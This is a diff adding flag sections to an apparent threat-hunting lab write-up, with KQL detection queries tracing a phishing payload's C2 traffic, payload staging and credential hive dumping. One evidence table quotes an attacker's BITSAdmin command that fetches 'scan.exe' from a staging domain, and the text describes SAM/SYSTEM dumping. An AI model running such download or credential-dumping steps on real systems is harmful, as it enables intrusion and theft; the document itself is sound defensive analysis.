@@ -305,6 +305,9 @@ Early detection of persistence layering and fileless execution is critical to di
 ---
 
 ## 🔍 Flag Analysis
+
+_All flags below are collapsible for readability._
+
 <details>
 <summary><strong>🚩 Flag 1: First Malicious Filename</strong></summary>
 
@@ -554,6 +557,143 @@ DeviceNetworkEvents
 | where InitiatingProcessFileName =~ "daniel_richardson_cv.pdf.exe"
 | project Timestamp, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName
 | order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 7: C2 Initiating Process</strong></summary>
+
+### 🎯 Objective  
+Identify the process responsible for initiating outbound command-and-control (C2) communications.
+
+---
+
+### 📌 Finding  
+Network telemetry on **as-pc1** confirmed that outbound connections to the previously identified C2 infrastructure were initiated directly by the malicious payload. The `InitiatingProcessFileName` field consistently showed **daniel_richardson_cv.pdf.exe**, confirming that the phishing payload itself established external communications immediately after execution.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Host | as-pc1 |
+| RemoteUrl | cdn.cloud-endpoint.net |
+| RemoteIP | 104.21.30.237 |
+| RemotePort | 443 |
+| InitiatingProcessFileName | daniel_richardson_cv.pdf.exe |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceNetworkEvents
+| where Timestamp between (start .. end)
+| where DeviceName =~ "as-pc1"
+| where InitiatingProcessFileName =~ "daniel_richardson_cv.pdf.exe"
+| project Timestamp, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName
+| order by Timestamp asc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 8: Staging Infrastructure (Payload Hosting Domain)</strong></summary>
+
+### 🎯 Objective  
+Identify the external domain used by the attacker to host additional payloads (staging infrastructure).
+
+---
+
+### 📌 Finding  
+Process telemetry across compromised hosts revealed repeated outbound payload retrieval using **BITSAdmin**, a native Windows utility commonly abused for stealthy file transfers. Analysis of command-line artifacts identified a staging domain used to download additional tooling.
+
+The domain **sync.cloud-endpoint.net** appeared in multiple execution artifacts and was used to retrieve a secondary payload (`scan.exe`) into a temporary directory, confirming its role as attacker staging infrastructure.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| Domain | sync.cloud-endpoint.net |
+| Hits | 9 |
+| Example Command | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Temp\scan.exe` |
+| First Seen (UTC) | 2026-01-15T04:52:22.9618142Z |
+| Last Seen (UTC) | 2026-01-27T20:50:35.8888831Z |
+| Technique | Living-off-the-Land Binary (BITSAdmin) |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end   = datetime(2026-02-23);
+DeviceProcessEvents
+| extend EventTime = coalesce(Timestamp, TimeGenerated)
+| where EventTime between (start .. end)
+| where DeviceName in~ ("as-pc1","as-pc2")
+| extend Cmd = coalesce(ProcessCommandLine, InitiatingProcessCommandLine)
+| where Cmd has_any ("http://", "https://")
+| extend Url = extract(@"https?://[^\s""]+", 0, Cmd)
+| extend Domain = tostring(parse_url(Url).Host)
+| where isnotempty(Domain)
+| summarize Hits=count(), ExampleCmd=any(Cmd), FirstSeen=min(EventTime), LastSeen=max(EventTime) by Domain
+| order by Hits desc
+```
+
+</details>
+
+---
+
+<details>
+<summary><strong>🚩 Flag 9: Registry Targets (Credential Store Dumping)</strong></summary>
+
+### 🎯 Objective  
+Identify which local registry hives were targeted by the attacker during credential harvesting.
+
+---
+
+### 📌 Finding  
+Process telemetry across compromised hosts revealed execution of **reg.exe** commands consistent with registry hive dumping. Analysis of command-line artifacts confirmed access to sensitive credential storage locations on the local system.
+
+Two high-value registry hives were targeted:
+- **SAM** — Stores local account password hashes  
+- **SYSTEM** — Contains the boot key required to decrypt SAM hashes  
+
+This pairing strongly indicates preparation for offline credential extraction and potential lateral movement.
+
+---
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|------|
+| DeviceName | as-pc1 |
+| Hive Count | 2 |
+| Targeted Hives | `HKLM\SYSTEM`, `HKLM\SAM` |
+| Tool Used | reg.exe |
+
+---
+
+### 🧠 Query
+```kql
+let start = datetime(2026-01-15);
+let end = datetime(2026-02-23);
+DeviceProcessEvents
+| where Timestamp between (start .. end)
+| where DeviceName in ("as-pc1","as-pc2")
+| where FileName =~ "reg.exe"
+| where ProcessCommandLine has_any (" save ", " export ")
+| extend TargetHive = tostring(extract(@"(?i)\b(save|export)\s+([^\s]+)", 2, ProcessCommandLine))
+| summarize count(), make_set(TargetHive) by DeviceName
 ```
 
 </details>
